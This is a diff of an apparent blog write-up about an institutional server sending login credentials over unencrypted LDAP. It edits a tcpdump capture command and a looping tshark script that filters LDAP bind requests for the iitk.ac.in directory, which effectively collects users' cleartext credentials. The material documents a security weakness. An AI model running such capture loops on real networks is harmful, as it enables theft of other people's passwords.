@@ -419,7 +419,7 @@ However, what truly alarmed me was that the server was not utilizing SSL for dat
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/sbin/tcpdump -s <span class="m">65535</span> -w network_traffic_capture.pcap <span class="s1">&#39;tcp port 389 and src 172.31.1.148 and dst 172.31.1.1&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/sbin/tcpdump -s <span class="m">65535</span> -w network_traffic_capture.pcap <span class="s1">&#39;tcp port 389&#39;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>After successfully logging into the server using my Computer Center credentials on another terminal, I stopped the network capture and downloaded the pcap file for further analysis.</p>
@@ -462,7 +462,7 @@ This confirmed my suspicions: the Computer Center credentials were indeed transm
 </span></span><span class="line"><span class="cl"><span class="nv">index</span><span class="o">=</span><span class="m">0</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
-</span></span><span class="line"><span class="cl">	/usr/sbin/tshark -w webhome.pcap -i <span class="m">1</span> -f <span class="s2">&#34;tcp port 389 and host 172.31.1.148 and dst host 172.31.1.1&#34;</span> -a filesize:100000
+</span></span><span class="line"><span class="cl">	/usr/sbin/tshark -w webhome.pcap -i <span class="m">1</span> -f <span class="s2">&#34;tcp port 389&#34;</span> -a filesize:100000
 </span></span><span class="line"><span class="cl">	/usr/sbin/tshark -r webhome.pcap -R <span class="s2">&#34;frame contains \&#34;ou=People,dc=iitk,dc=ac,dc=in\&#34; and ldap.bindRequest&#34;</span> -w webhome_filtered_<span class="si">${</span><span class="nv">index</span><span class="si">}</span>.pcap
 </span></span><span class="line"><span class="cl">	chmod <span class="m">600</span> webhome_filtered_<span class="si">${</span><span class="nv">index</span><span class="si">}</span>.pcap
 </span></span><span class="line"><span class="cl">	rm -f webhome.pcap
